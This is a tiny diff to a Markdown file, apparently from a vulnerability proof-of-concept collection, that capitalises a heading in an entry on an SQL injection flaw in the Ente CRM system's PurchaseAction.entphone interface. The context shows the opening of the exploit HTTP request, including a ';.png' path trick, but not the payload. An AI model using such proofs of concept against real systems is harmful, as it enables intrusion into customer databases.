@@ -1,6 +1,6 @@
 ## 浙大恩特客户资源管理系统-purchaseaction.entphone接口存在SQL漏洞
 
-## poc
+## POC
 ```
 POST /entsoft/PurchaseAction.entphone;.png?method=AuthorityJudgement HTTP/1.1
 Host: 
